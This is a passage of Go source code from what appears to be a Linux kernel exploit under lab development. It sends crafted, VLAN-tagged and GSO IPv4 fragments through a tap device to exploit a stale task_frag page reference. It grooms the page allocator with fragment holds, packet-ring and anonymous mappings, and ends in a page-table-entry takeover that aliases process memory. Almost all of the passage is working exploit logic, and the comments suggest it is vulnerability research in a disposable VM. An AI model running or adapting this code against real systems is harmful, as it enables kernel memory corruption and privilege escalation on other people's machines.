			c.staleFragSeeds, c.staleFragSeedLen, c.staleFragGSOType, c.staleFragHdrLen)
	}
	if c.staleGroom {
		var hold *capture
		if c.staleHold {
			var err error
			hold, err = listen(getenv("PWN_TAP", "bengskytap"))
			if err != nil {
				return fmt.Errorf("stale-options: open groom hold socket: %w", err)
			}
			if err := syscall.SetsockoptInt(hold.fd, syscall.SOL_SOCKET, syscall.SO_RCVBUF, 4<<20); err != nil {
				hold.Close()
				return fmt.Errorf("stale-options: grow groom hold queue: %w", err)
			}
		}
		for i := 0; i < c.staleGrooms; i++ {
			frame, err := stalePageGroomFrame(0x6b, c.staleHead, c.staleFragPage, c.staleSKB, c.staleDev, c.staleCallback, c.staleCopyLen, c.staleExec, c.staleNoop, c.staleCommand)
			if err != nil {
				if hold != nil {
					hold.Close()
				}
				return fmt.Errorf("stale-options: build page groom %d/%d: %w", i+1, c.staleGrooms, err)
			}
			if err := writeTap(tap, frame, false, 0, 0); err != nil {
				if hold != nil {
					hold.Close()
				}
				return fmt.Errorf("stale-options: page groom %d/%d: %w", i+1, c.staleGrooms, err)
			}
			if c.staleEach > 0 {
				time.Sleep(c.staleEach)
			}
		}
		if hold != nil {
			if err := hold.drainCount(c.staleGrooms, 2*time.Second); err != nil {
				hold.Close()
				return fmt.Errorf("stale-options: drain groom hold queue: %w", err)
			}
			hold.Close()
		}
		// The output capture socket also sees the marker frames. Drain it so
		// those queued clones release their page references before the short
		// fragment asks task_frag to recycle the just-seeded compound page.
		cap.drain(c.staleDelay)
	}
	const desired = uint16(0x0045) // network bytes 45 00: shrink IHL 15 to IHL 5
	id := uint16(ipID)
	headPayload := bytesRepeat(8, 0x31)
	shortPayload := bytesRepeat(8, 0x42)
	optionAt := c.staleOptSkip
	if optionAt > 0 {
		shortPayload[0] = 0x80 // copied unknown option: advance without memset
		shortPayload[1] = byte(optionAt)
	}
	shortPayload[optionAt] = 0x44 // non-copied Timestamp option
	shortPayload[optionAt+1] = byte(c.staleOptLen)
	if end := optionAt + c.staleOptLen; end < len(shortPayload) {
		shortPayload[end] = 0 // stop before interpreting filler as another option
	}
	finalPayload := bytesRepeat(128, 0x53)
	allPayload := append(append(append([]byte(nil), headPayload...), shortPayload...), finalPayload...)
	options := bytesRepeat(40, byte(1))
	whole := ipv4PacketWithOptions(0, false, allPayload, id, options)
	forwardTTL(whole)
	adjust := len(whole) - len(finalPayload) + 32
	if !solvePacketChecksumAt(whole, adjust, desired) {
		return fmt.Errorf("stale-options: cannot solve deferred checksum word 0x%04x", desired)
	}
	copy(finalPayload[32:34], whole[adjust:adjust+2])

	frames := [][]byte{
		frameWithVLAN(ipv4PacketWithOptions(8, true, shortPayload, id, nil), c.vlanTags),
		frameWithVLAN(ipv4PacketWithOptions(16, false, finalPayload, id, nil), c.vlanTags),
	}
	for i, f := range frames {
		var err error
		if i == 0 && c.staleFragPadLen != 0 {
			f = stalePaddedGSOFrame(f, c.staleFragPadLen, 0x74)
			err = writeTapGSO(tap, f, byte(c.staleFragGSOType), uint16(c.staleFragHdrLen), 1400,
				true, uint16(l2LenForTags(c.vlanTags)+ipLen), 0)
		} else {
			err = writeTap(tap, f, true, uint16(l2LenForTags(c.vlanTags)+ipLen), 0)
		}
		if err != nil {
			return err
		}
	}
	head := frameWithVLAN(ipv4PacketWithOptions(0, true, headPayload, id, options), c.vlanTags)
	if err := writeTap(tap, head, true, uint16(l2LenForTags(c.vlanTags)), 0); err != nil {
		return err
	}

	collectID := id
	var overlapWant []byte
	if c.staleNaturalAnon {
		// Release packet-socket clones so the natural stale descriptor has
		// dropped the order-3 page to refcount zero. Reclaim it first with an
		// incomplete jumbo, then hold enough other order-3 fragments that their
		// near-simultaneous expiry may drain the high-order per-CPU page list back
		// to the buddy allocator. The anonymous faults test whether that is enough
		// to split and reclaim the formerly compound page; current lab runs report
		// marker_offset=-1, so this is a falsifiable allocator probe, not a proven
		// transition.
		cap.drain(c.staleDelay)
		for i := 0; i < c.staleAnonJumbos; i++ {
			middle, _, _ := staleNaturalOverlapFrames(c, id+1+uint16(i))
			if err := writeTapGSO(tap, middle, byte(c.staleFragGSOType), uint16(c.staleFragHdrLen), 1400,
				false, 0, 0); err != nil {
				return fmt.Errorf("stale-options: anonymous order-3 hold %d/%d: %w", i+1, c.staleAnonJumbos, err)
			}
		}
		fmt.Printf("stale-options: natural-anon held_order3=%d expiry_wait=%s\n",
			c.staleAnonJumbos, c.staleAnonWait)
		time.Sleep(c.staleAnonWait)
		var err error
		anon, err = syscall.Mmap(-1, 0, c.staleAnonSize, syscall.PROT_READ|syscall.PROT_WRITE,
			syscall.MAP_PRIVATE|syscall.MAP_ANON|mapPopulate)
		if err != nil {
			return fmt.Errorf("stale-options: populate anonymous reclaim mapping: %w", err)
		}
		// This mode intentionally retains the mapping through process exit. A
		// later stage will make its host page reference stale, at which point an
		// explicit munmap would itself be another unmatched put_page().
		defer runtime.KeepAlive(anon)
		for off := 0; off < len(anon); off += 4096 {
			anon[off] = 0xa6
		}
		probeMarker := []byte("BENGSKY_TASK_FRAG_TO_ANON_93EF02A6")
		probe := make([]byte, ethLen+len(probeMarker))
		copy(probe[0:6], []byte{2, 0, 0, 0, 0, 1})
		copy(probe[6:12], []byte{2, 0, 0, 0, 0, 2})
		binary.BigEndian.PutUint16(probe[12:14], ethPExperiment)
		copy(probe[14:], probeMarker)
		if err := writeTap(tap, probe, false, 0, 0); err != nil {
			return fmt.Errorf("stale-options: anonymous reclaim marker: %w", err)
		}
		markerAt := -1
		for off := 0; off < len(anon); off += 4096 {
			end := min(off+512, len(anon))
			if within := bytes.Index(anon[off:end], probeMarker); within >= 0 {
				markerAt = off + within
				break
			}
		}
		fmt.Printf("stale-options: natural-anon bytes=%d held_order3=%d marker_offset=%d matched=%t\n",
			len(anon), c.staleAnonJumbos, markerAt, markerAt >= 0)
		if markerAt < 0 {
			return errors.New("stale-options: dangling task_frag write did not reach the anonymous mapping")
		}
	}
	if c.staleNaturalOverlap {
		// The completed stale-options datagram is emitted as many small
		// fragments on the lab's MTU-200 veth. The capture socket owns clones
		// that keep the poisoned task_frag page referenced; drain them before
		// asking the buddy allocator to hand that page to the second jumbo skb.
		cap.drain(c.staleDelay)
		collectID = id + 1
		if c.staleLocalSingleRef {
			return runStaleLocalSingleRef(tap, cap, c, collectID)
		}
		middle, overlapHead, overlapTail := staleNaturalOverlapFrames(c, collectID)
		var overlapBridge []byte
		localRawFD := -1
		if c.staleOverlapLocal {
			middle, overlapHead, overlapBridge, overlapTail = staleNaturalLocalCoalesceFrames(c, collectID)
			if c.staleLocalRollover != 0 {
				var err error
				localRawFD, err = syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, ipProtoRaw)
				if err != nil {
					return fmt.Errorf("stale-options: open local protocol-253 hold socket: %w", err)
				}
				defer syscall.Close(localRawFD)
				if err := syscall.Bind(localRawFD, &syscall.SockaddrInet4{Addr: [4]byte{10, 0, 0, 1}}); err != nil {
					return fmt.Errorf("stale-options: bind local protocol-253 hold socket: %w", err)
				}
				if err := syscall.SetsockoptInt(localRawFD, syscall.SOL_SOCKET, syscall.SO_RCVBUF, 1<<20); err != nil {
					return fmt.Errorf("stale-options: enlarge local protocol-253 hold socket: %w", err)
				}
			}
		}
		if err := writeTapGSO(tap, middle, byte(c.staleFragGSOType), uint16(c.staleFragHdrLen), 1400,
			false, 0, 0); err != nil {
			return fmt.Errorf("stale-options: overlap reclaim fragment: %w", err)
		}
		if err := writeTap(tap, overlapHead, false, 0, 0); err != nil {
			return fmt.Errorf("stale-options: overlap head fragment: %w", err)
		}
		if overlapBridge != nil {
			if err := writeTap(tap, overlapBridge, false, 0, 0); err != nil {
				return fmt.Errorf("stale-options: overlap bridge fragment: %w", err)
			}
		}
		if err := writeTap(tap, overlapTail, false, 0, 0); err != nil {
			return fmt.Errorf("stale-options: overlap tail fragment: %w", err)
		}
		if localRawFD >= 0 {
			time.Sleep(20 * time.Millisecond)
			queued, err := socketQueuedBytes(localRawFD)
			if err != nil {
				return fmt.Errorf("stale-options: inspect local protocol-253 hold socket: %w", err)
			}
			if queued == 0 {
				return errors.New("stale-options: local reassembled datagram was not queued on the hold socket")
			}
			rollover, err := stalePageGroomFrame(0x6d, 0, 0, 0, 0, 0, 0, 0, 0, "")
			if err != nil {
				return err
			}
			for i := 0; i < c.staleLocalRollover; i++ {
				if err := writeTap(tap, rollover, false, 0, 0); err != nil {
					return fmt.Errorf("stale-options: local task_frag rollover %d/%d: %w", i+1, c.staleLocalRollover, err)
				}
			}
			fmt.Printf("stale-options: local hold queued_bytes=%d rollover_writes=%d\n", queued, c.staleLocalRollover)
		}
		overlapWant = append([]byte(nil), overlapHead[:16]...)
	}
	if c.staleOverlapLocal {
		cap.drain(c.capture)
		fmt.Println("stale-options: local reclaim datagram submitted; post-coalesce verification requires the lab tracer")
		return nil
	}

	pkts := cap.collect(c.capture, collectID)
	fmt.Printf("stale-options: original_ihl=15 deferred_word=0x%04x option_skip=%d option_len=%d fragments=%d page=%t vlan_tags=%d groom=%t groom_count=%d groom_each=%s groom_delay=%s groom_hold=%t frag_pad_len=%d\n",
		desired, c.staleOptSkip, c.staleOptLen, len(pkts), c.page, c.vlanTags, c.staleGroom, c.staleGrooms, c.staleEach, c.staleDelay, c.staleHold, c.staleFragPadLen)
	for i, ip := range pkts {
		if len(ip) < ipLen {
			continue
		}
		ihl := int(ip[0]&0x0f) * 4
		off := int(binary.BigEndian.Uint16(ip[6:])&0x1fff) * 8
		payloadEnd := min(len(ip), int(binary.BigEndian.Uint16(ip[2:])))
		payload := []byte(nil)
		if ihl <= payloadEnd {
			payload = ip[ihl:payloadEnd]
		}
		fmt.Printf("  frag=%d ihl=%d offset=%d payload_len=%d payload_prefix=%s\n",
			i, ihl, off, len(payload), hex.EncodeToString(payload[:min(16, len(payload))]))
	}
	if len(pkts) == 0 {
		return errors.New("stale-options: no output fragments captured")
	}
	if c.staleNaturalOverlap {
		const overlapPayloadOffset = 80
		got, ok := ipv4PayloadWindow(pkts, overlapPayloadOffset, len(overlapWant))
		fmt.Printf("stale-options: natural-overlap payload_offset=%d got=%s want=%s matched=%t\n",
			overlapPayloadOffset, hex.EncodeToString(got), hex.EncodeToString(overlapWant), ok && bytes.Equal(got, overlapWant))
		if !ok || !bytes.Equal(got, overlapWant) {
			return errors.New("stale-options: dangling task_frag did not overwrite the live reclaimed fragment page")
		}
	}
	return nil
}

func socketQueuedBytes(fd int) (int, error) {
	var queued int32
	_, _, errno := syscall.Syscall(syscall.SYS_IOCTL, uintptr(fd), 0x541b,
		uintptr(unsafe.Pointer(&queued))) // FIONREAD on Linux
	if errno != 0 {
		return 0, errno
	}
	return int(queued), nil
}

func runStaleLocalSingleRef(tap *os.File, cap *capture, c cfg, anchorID uint16) error {
	localRawFD, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, ipProtoRaw)
	if err != nil {
		return fmt.Errorf("stale-options: open single-ref hold socket: %w", err)
	}
	if err := syscall.Bind(localRawFD, &syscall.SockaddrInet4{Addr: [4]byte{10, 0, 0, 1}}); err != nil {
		syscall.Close(localRawFD)
		return fmt.Errorf("stale-options: bind single-ref hold socket: %w", err)
	}
	if err := syscall.SetsockoptInt(localRawFD, syscall.SOL_SOCKET, syscall.SO_RCVBUF, 1<<20); err != nil {
		syscall.Close(localRawFD)
		return fmt.Errorf("stale-options: enlarge single-ref hold socket: %w", err)
	}

	for i := 0; i < c.staleSingleAnchors; i++ {
		anchor := staleNaturalJumboFragment(c, anchorID+uint16(i), 8, byte(0x70+i%16))
		if err := writeTapGSO(tap, anchor, byte(c.staleFragGSOType), uint16(c.staleFragHdrLen), 1400,
			false, 0, 0); err != nil {
			syscall.Close(localRawFD)
			return fmt.Errorf("stale-options: single-ref anchor %d/%d: %w", i+1, c.staleSingleAnchors, err)
		}
	}

	localID := anchorID + uint16(c.staleSingleAnchors)
	localHead, localBridge := staleNaturalLocalSingleRefFrames(c, localID)
	if err := writeTapGSO(tap, localHead, byte(c.staleFragGSOType), 322, 1400,
		false, 0, 0); err != nil {
		syscall.Close(localRawFD)
		return fmt.Errorf("stale-options: single-ref local head: %w", err)
	}
	if err := writeTap(tap, localBridge, false, 0, 0); err != nil {
		syscall.Close(localRawFD)
		return fmt.Errorf("stale-options: single-ref local bridge: %w", err)
	}
	time.Sleep(20 * time.Millisecond)
	queued, err := socketQueuedBytes(localRawFD)
	if err != nil || queued == 0 {
		syscall.Close(localRawFD)
		if err != nil {
			return fmt.Errorf("stale-options: inspect single-ref hold socket: %w", err)
		}
		return errors.New("stale-options: single-ref local datagram was not queued")
	}

	rollover, err := stalePageGroomFrame(0x6d, 0, 0, 0, 0, 0, 0, 0, 0, "")
	if err != nil {
		syscall.Close(localRawFD)
		return err
	}
	for i := 0; i < c.staleLocalRollover; i++ {
		if err := writeTap(tap, rollover, false, 0, 0); err != nil {
			syscall.Close(localRawFD)
			return fmt.Errorf("stale-options: single-ref rollover %d/%d: %w", i+1, c.staleLocalRollover, err)
		}
	}
	pcpFD := -1
	pcpQueued := 0
	if c.staleSinglePCPPrime != 0 {
		pcpFD, pcpQueued, err = holdOrder3PCP(tap, c, localID+0x1000, c.staleSinglePCPPrime)
		if err != nil {
			syscall.Close(localRawFD)
			return err
		}
	}
	if err := syscall.Close(localRawFD); err != nil {
		if pcpFD >= 0 {
			syscall.Close(pcpFD)
		}
		return fmt.Errorf("stale-options: close single-ref hold socket: %w", err)
	}
	if pcpFD >= 0 {
		if err := syscall.Close(pcpFD); err != nil {
			return fmt.Errorf("stale-options: close PCP-prime hold socket: %w", err)
		}
		time.Sleep(c.staleSinglePCPWait)
	} else {
		time.Sleep(20 * time.Millisecond)
	}
	if c.staleSingleAnon {
		return reclaimSingleRefAsAnon(tap, cap, c, anchorID, localID, queued, pcpQueued)
	}
	if c.staleSingleRing {
		return reclaimSingleRefAsPacketRing(tap, cap, c, anchorID, localID, queued, pcpQueued)
	}
	if c.staleSinglePTE {
		return reclaimSingleRefAsPTE(tap, cap, c, anchorID, localID, queued, pcpQueued)
	}

	reclaimID := localID + 1
	for i := 0; i < c.staleSingleAnchors; i++ {
		reclaim := staleNaturalJumboFragment(c, reclaimID+uint16(i), 8, byte(0x80+i%16))
		if err := writeTapGSO(tap, reclaim, byte(c.staleFragGSOType), uint16(c.staleFragHdrLen), 1400,
			false, 0, 0); err != nil {
			return fmt.Errorf("stale-options: single-ref order-3 reclaim %d/%d: %w", i+1, c.staleSingleAnchors, err)
		}
	}

	staleAnchor := -1
	staleFill := byte(0)
	for i := 0; i < c.staleSingleAnchors; i++ {
		_, head, tail := staleNaturalOverlapFrames(c, anchorID+uint16(i))
		if err := writeTap(tap, head, false, 0, 0); err != nil {
			return fmt.Errorf("stale-options: complete single-ref anchor %d head: %w", i, err)
		}
		if err := writeTap(tap, tail, false, 0, 0); err != nil {
			return fmt.Errorf("stale-options: complete single-ref anchor %d tail: %w", i, err)
		}
		pkts := cap.collect(c.capture, anchorID+uint16(i))
		window, ok := ipv4PayloadWindow(pkts, 16, 16)
		if !ok || len(window) == 0 {
			continue
		}
		uniform := true
		for _, b := range window[1:] {
			if b != window[0] {
				uniform = false
				break
			}
		}
		if uniform && window[0] >= 0x80 && window[0] < byte(0x80+c.staleSingleAnchors) {
			staleAnchor = i
			staleFill = window[0]
			break
		}
	}
	if staleAnchor < 0 {
		return errors.New("stale-options: no anchor disclosed a reclaimed order-3 payload")
	}
	fmt.Printf("stale-options: single-ref queued_bytes=%d rollover_writes=%d anchors=%d anchor_ids=%#x..%#x local_id=%#x reclaim_ids=%#x..%#x stale_anchor=%d reclaimed_fill=%#02x\n",
		queued, c.staleLocalRollover, c.staleSingleAnchors, anchorID,
		anchorID+uint16(c.staleSingleAnchors-1), localID, reclaimID,
		reclaimID+uint16(c.staleSingleAnchors-1), staleAnchor, staleFill)
	return nil
}

func holdOrder3PCP(tap *os.File, c cfg, baseID uint16, count int) (int, int, error) {
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, ipProtoPCP)
	if err != nil {
		return -1, 0, fmt.Errorf("stale-options: open PCP-prime hold socket: %w", err)
	}
	ok := false
	defer func() {
		if !ok {
			syscall.Close(fd)
		}
	}()
	if err := syscall.Bind(fd, &syscall.SockaddrInet4{Addr: [4]byte{10, 0, 0, 1}}); err != nil {
		return -1, 0, fmt.Errorf("stale-options: bind PCP-prime hold socket: %w", err)
	}
	rcvbuf := max(4<<20, count*65536)
	if err := syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, soRcvbufForce, rcvbuf); err != nil {
		return -1, 0, fmt.Errorf("stale-options: force PCP-prime receive buffer: %w", err)
	}
	dst := net.ParseIP("10.0.0.1").To4()
	for i := 0; i < count; i++ {
		middle, head, tail := staleNaturalOverlapFramesForProto(c, baseID+uint16(i), dst, ipProtoPCP)
		if err := writeTapGSO(tap, middle, byte(c.staleFragGSOType), uint16(c.staleFragHdrLen), 1400,
			false, 0, 0); err != nil {
			return -1, 0, fmt.Errorf("stale-options: PCP-prime jumbo %d/%d: %w", i+1, count, err)
		}
		if err := writeTap(tap, head, false, 0, 0); err != nil {
			return -1, 0, fmt.Errorf("stale-options: PCP-prime head %d/%d: %w", i+1, count, err)
		}
		if err := writeTap(tap, tail, false, 0, 0); err != nil {
			return -1, 0, fmt.Errorf("stale-options: PCP-prime tail %d/%d: %w", i+1, count, err)
		}
	}
	time.Sleep(20 * time.Millisecond)
	queued, err := socketQueuedBytes(fd)
	if err != nil {
		return -1, 0, fmt.Errorf("stale-options: inspect PCP-prime hold socket: %w", err)
	}
	if queued == 0 {
		return -1, 0, errors.New("stale-options: PCP-prime socket did not queue a completed datagram")
	}
	ok = true
	return fd, queued, nil
}

func reclaimSingleRefAsAnon(tap *os.File, cap *capture, c cfg, anchorID, localID uint16,
	queued, pcpQueued int) error {
	anon, err := syscall.Mmap(-1, 0, c.staleAnonSize, syscall.PROT_READ|syscall.PROT_WRITE,
		syscall.MAP_PRIVATE|syscall.MAP_ANON|mapPopulate)
	if err != nil {
		return fmt.Errorf("stale-options: populate single-ref anonymous reclaim mapping: %w", err)
	}
	defer runtime.KeepAlive(anon)
	const fill = byte(0xa6)
	for page := 0; page < len(anon); page += 4096 {
		for i := page; i < min(page+512, len(anon)); i++ {
			anon[i] = fill
		}
	}

	staleAnchor := -1
	for i := 0; i < c.staleSingleAnchors; i++ {
		_, head, tail := staleNaturalOverlapFrames(c, anchorID+uint16(i))
		if err := writeTap(tap, head, false, 0, 0); err != nil {
			return fmt.Errorf("stale-options: complete anonymous single-ref anchor %d head: %w", i, err)
		}
		if err := writeTap(tap, tail, false, 0, 0); err != nil {
			return fmt.Errorf("stale-options: complete anonymous single-ref anchor %d tail: %w", i, err)
		}
		pkts := cap.collect(c.capture, anchorID+uint16(i))
		window, ok := ipv4PayloadWindow(pkts, 16, 32)
		if !ok {
			continue
		}
		matched := true
		for _, b := range window {
			if b != fill {
				matched = false
				break
			}
		}
		if matched {
			staleAnchor = i
			break
		}
	}
	fmt.Printf("stale-options: single-ref-anon queued_bytes=%d pcp_first_datagram=%d pcp_prime=%d pcp_wait=%s anon_bytes=%d anchors=%d local_id=%#x stale_anchor=%d matched=%t\n",
		queued, pcpQueued, c.staleSinglePCPPrime, c.staleSinglePCPWait, len(anon), c.staleSingleAnchors,
		localID, staleAnchor, staleAnchor >= 0)
	if staleAnchor < 0 {
		return errors.New("stale-options: cleanly freed order-3 target was not observed in the order-0 anonymous mapping")
	}
	return nil
}

type tpacketReq struct {
	BlockSize uint32
	BlockNr   uint32
	FrameSize uint32
	FrameNr   uint32
}

func setPacketRXRing(fd int, req *tpacketReq) error {
	_, _, errno := syscall.Syscall6(syscall.SYS_SETSOCKOPT, uintptr(fd), uintptr(solPacket),
		uintptr(packetRXRing), uintptr(unsafe.Pointer(req)), unsafe.Sizeof(*req), 0)
	if errno != 0 {
		return errno
	}
	return nil
}

func packetRingRequest(size int) tpacketReq {
	pages := uint32(size / 4096)
	return tpacketReq{BlockSize: 4096, BlockNr: pages, FrameSize: 4096, FrameNr: pages}
}

func allocatePacketRing(size int) (int, []byte, error) {
	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(ethPAll)))
	if err != nil {
		return -1, nil, err
	}
	if err := syscall.SetsockoptInt(fd, solPacket, packetVersion, tpacketV2); err != nil {
		syscall.Close(fd)
		return -1, nil, err
	}
	req := packetRingRequest(size)
	if err := setPacketRXRing(fd, &req); err != nil {
		syscall.Close(fd)
		return -1, nil, err
	}
	ring, err := syscall.Mmap(fd, 0, size, syscall.PROT_READ|syscall.PROT_WRITE, syscall.MAP_SHARED)
	if err != nil {
		syscall.Close(fd)
		return -1, nil, err
	}
	return fd, ring, nil
}

func reclaimSingleRefAsPacketRing(tap *os.File, cap *capture, c cfg, anchorID, localID uint16,
	queued, pcpQueued int) error {
	fd, ring, err := allocatePacketRing(c.staleSingleRingSize)
	if err != nil {
		return fmt.Errorf("stale-options: allocate PACKET_RX_RING reclaim: %w", err)
	}
	// Intentionally keep the socket and mapping alive through the stale read.
	// Releasing either after a successful overlap would perform another put on
	// a page whose refcount the stale descriptor has already changed.
	pages := c.staleSingleRingSize / 4096
	const fill = byte(0xb6)
	for i := range ring {
		ring[i] = fill
	}

	staleAnchor := -1
	for i := 0; i < c.staleSingleAnchors; i++ {
		_, head, tail := staleNaturalOverlapFrames(c, anchorID+uint16(i))
		if err := writeTap(tap, head, false, 0, 0); err != nil {
			return fmt.Errorf("stale-options: complete packet-ring single-ref anchor %d head: %w", i, err)
		}
		if err := writeTap(tap, tail, false, 0, 0); err != nil {
			return fmt.Errorf("stale-options: complete packet-ring single-ref anchor %d tail: %w", i, err)
		}
		pkts := cap.collect(c.capture, anchorID+uint16(i))
		window, ok := ipv4PayloadWindow(pkts, 16, 32)
		if !ok {
			fmt.Printf("stale-options: packet-ring anchor=%d window=missing\n", i)
			continue
		}
		fmt.Printf("stale-options: packet-ring anchor=%d window=%s\n", i, hex.EncodeToString(window))
		matched := true
		for _, b := range window {
			if b != fill {
				matched = false
				break
			}
		}
		if matched {
			staleAnchor = i
			break
		}
	}
	fmt.Printf("stale-options: single-ref-packet-ring queued_bytes=%d pcp_first_datagram=%d pcp_prime=%d pcp_wait=%s ring_bytes=%d ring_pages=%d anchors=%d local_id=%#x stale_anchor=%d matched=%t\n",
		queued, pcpQueued, c.staleSinglePCPPrime, c.staleSinglePCPWait, len(ring), pages,
		c.staleSingleAnchors, localID, staleAnchor, staleAnchor >= 0)
	runtime.KeepAlive(ring)
	runtime.KeepAlive(fd)
	if staleAnchor < 0 {
		return errors.New("stale-options: cleanly freed order-3 target was not observed in the order-0 PACKET_RX_RING")
	}
	return nil
}

const (
	pmdSpan           = 2 << 20
	pagemapPFNMask    = (uint64(1) << 55) - 1
	x86PTEAddressMask = uint64(0x000ffffffffff000)
)

func sparsePTEFirstOffset(base uintptr) int {
	return int((uintptr(pmdSpan) - base%uintptr(pmdSpan)) % uintptr(pmdSpan))
}

func sparsePTEMapping(count int) ([]byte, map[uint64]int, error) {
	length := count*pmdSpan + pmdSpan
	mapping, err := syscall.Mmap(-1, 0, length, syscall.PROT_READ|syscall.PROT_WRITE,
		syscall.MAP_PRIVATE|syscall.MAP_ANON|mapNoReserve)
	if err != nil {
		return nil, nil, err
	}
	if err := syscall.Madvise(mapping, madvNoHugepage); err != nil {
		return nil, nil, fmt.Errorf("MADV_NOHUGEPAGE: %w", err)
	}
	base := uintptr(unsafe.Pointer(&mapping[0]))
	first := sparsePTEFirstOffset(base)
	for i := 0; i < count; i++ {
		mapping[first+i*pmdSpan] = byte(0xc7)
	}

	pagemap, err := os.Open("/proc/self/pagemap")
	if err != nil {
		return nil, nil, err
	}
	defer pagemap.Close()
	expected := make(map[uint64]int, count)
	var raw [8]byte
	for i := 0; i < count; i++ {
		virtual := uint64(base) + uint64(first+i*pmdSpan)
		if _, err := pagemap.ReadAt(raw[:], int64((virtual/4096)*8)); err != nil {
			return nil, nil, err
		}
		entry := binary.LittleEndian.Uint64(raw[:])
		if entry&(uint64(1)<<63) == 0 {
			return nil, nil, fmt.Errorf("sparse page %d is not present in pagemap", i)
		}
		pfn := entry & pagemapPFNMask
		if pfn == 0 {
			return nil, nil, errors.New("pagemap PFNs are hidden; PTE ownership cannot be verified")
		}
		expected[(pfn<<12)&x86PTEAddressMask] = i
	}
	return mapping, expected, nil
}

func reclaimSingleRefAsPTE(tap *os.File, cap *capture, c cfg, anchorID, localID uint16,
	queued, pcpQueued int) error {
	mapping, expected, err := sparsePTEMapping(c.staleSinglePTECount)
	if err != nil {
		return fmt.Errorf("stale-options: allocate sparse PTE reclaim mapping: %w", err)
	}
	staleAnchor := -1
	matchedSparsePage := -1
	matchedEntry := uint64(0)
	for i := 0; i < c.staleSingleAnchors; i++ {
		_, head, tail := staleNaturalOverlapFrames(c, anchorID+uint16(i))
		if err := writeTap(tap, head, false, 0, 0); err != nil {
			return fmt.Errorf("stale-options: complete PTE single-ref anchor %d head: %w", i, err)
		}
		if err := writeTap(tap, tail, false, 0, 0); err != nil {
			return fmt.Errorf("stale-options: complete PTE single-ref anchor %d tail: %w", i, err)
		}
		pkts := cap.collect(c.capture, anchorID+uint16(i))
		window, ok := ipv4PayloadWindow(pkts, 16, 32)
		if !ok {
			fmt.Printf("stale-options: pte anchor=%d window=missing\n", i)
			continue
		}
		entry := binary.LittleEndian.Uint64(window[:8])
		physical := entry & x86PTEAddressMask
		sparsePage, matched := expected[physical]
		fmt.Printf("stale-options: pte anchor=%d window=%s entry=%#x physical=%#x matched=%t\n",
			i, hex.EncodeToString(window), entry, physical, matched)
		if matched && entry&1 != 0 {
			staleAnchor = i
			matchedSparsePage = sparsePage
			matchedEntry = entry
			break
		}
	}
	fmt.Printf("stale-options: single-ref-pte queued_bytes=%d pcp_first_datagram=%d pcp_prime=%d pcp_wait=%s pte_pages=%d virtual_bytes=%d anchors=%d local_id=%#x stale_anchor=%d sparse_page=%d pte=%#x matched=%t\n",
		queued, pcpQueued, c.staleSinglePCPPrime, c.staleSinglePCPWait,
		c.staleSinglePTECount, len(mapping), c.staleSingleAnchors, localID,
		staleAnchor, matchedSparsePage, matchedEntry, staleAnchor >= 0)
	if staleAnchor < 0 {
		runtime.KeepAlive(mapping)
		return errors.New("stale-options: cleanly freed order-3 target was not observed as a process PTE page")
	}
	if c.staleSinglePTETakeover {
		fd, ring, err := allocatePacketRing(c.staleSingleRingSize)
		if err != nil {
			return fmt.Errorf("stale-options: allocate PTE-takeover packet ring: %w", err)
		}
		controlledPTE := matchedEntry
		for offset := 0; offset < len(ring); offset += 8 {
			binary.LittleEndian.PutUint64(ring[offset:offset+8], controlledPTE)
		}
		base := uintptr(unsafe.Pointer(&mapping[0]))
		originalOffset := sparsePTEFirstOffset(base) + matchedSparsePage*pmdSpan
		aliasOffset := originalOffset + 4096
		aliasBefore := mapping[aliasOffset]
		mapping[aliasOffset] = 0x4d
		originalAfter := mapping[originalOffset]
		matched := aliasBefore == 0xc7 && originalAfter == 0x4d
		fmt.Printf("stale-options: pte-takeover ring_bytes=%d controlled_pte=%#x original_offset=%#x alias_offset=%#x alias_before=%#x original_after=%#x matched=%t\n",
			len(ring), controlledPTE, originalOffset, aliasOffset, aliasBefore, originalAfter, matched)
		runtime.KeepAlive(ring)
		runtime.KeepAlive(fd)
		if !matched {
			return errors.New("stale-options: packet-ring reclaim did not create the controlled PTE alias")
		}
	}
	if c.staleSingleHold != 0 {
		fmt.Printf("stale-options: holding live PTE state for %s; shut down the disposable VM before teardown\n", c.staleSingleHold)
		time.Sleep(c.staleSingleHold)
	}
	runtime.KeepAlive(mapping)
	return nil
}

func staleNaturalOverlapFrames(c cfg, id uint16) (middle, head, tail []byte) {
	return staleNaturalOverlapFramesFor(c, id, net.ParseIP("10.99.0.2").To4())
}

func staleNaturalOverlapFramesFor(c cfg, id uint16, dst net.IP) (middle, head, tail []byte) {
	return staleNaturalOverlapFramesForProto(c, id, dst, ipProtoRaw)
}

func staleNaturalOverlapFramesForProto(c cfg, id uint16, dst net.IP, proto byte) (middle, head, tail []byte) {
	// The second jumbo fragment has the same exact split as the natural
	// descriptor seed: hdr_len bytes are linear and one order-3 page is
	// nonlinear. Its logical IPv4 length now retains that whole page, so the
	// reassembly queue keeps the allocation live instead of trimming it.
	l2 := l2LenForTags(c.vlanTags)
	middlePayloadLen := c.staleFragPadLen - l2 - ipLen
	middlePayload := bytesRepeat(middlePayloadLen, 0x72)
	src := net.ParseIP("10.0.0.2").To4()
	middle = frameWithVLAN(ipv4PacketWithOptionsFor(8, true, middlePayload, id, nil,
		src, dst, proto), c.vlanTags)

	headPayload := bytesRepeat(8, 0x68)
	head = frameWithoutVLAN(ipv4PacketWithOptionsFor(0, true, headPayload, id, nil,
		src, dst, proto))
	tailPayload := bytesRepeat(8, 0x7a)
	tail = frameWithoutVLAN(ipv4PacketWithOptionsFor(8+middlePayloadLen, false, tailPayload, id, nil,
		src, dst, proto))
	return middle, head, tail
}

func staleNaturalJumboFragment(c cfg, id uint16, offset int, fill byte) []byte {
	l2 := l2LenForTags(c.vlanTags)
	payloadLen := c.staleFragPadLen - l2 - ipLen
	return frameWithVLAN(ipv4PacketWithOptions(offset, true, bytesRepeat(payloadLen, fill), id, nil),
		c.vlanTags)
}

func staleNaturalLocalSingleRefFrames(c cfg, id uint16) (head, bridge []byte) {
	src := net.ParseIP("10.0.0.2").To4()
	dst := net.ParseIP("10.0.0.1").To4()
	logicalHead := frameWithVLAN(ipv4PacketWithOptionsFor(0, true, bytesRepeat(8, 0x68), id, nil,
		src, dst, ipProtoRaw), c.vlanTags)
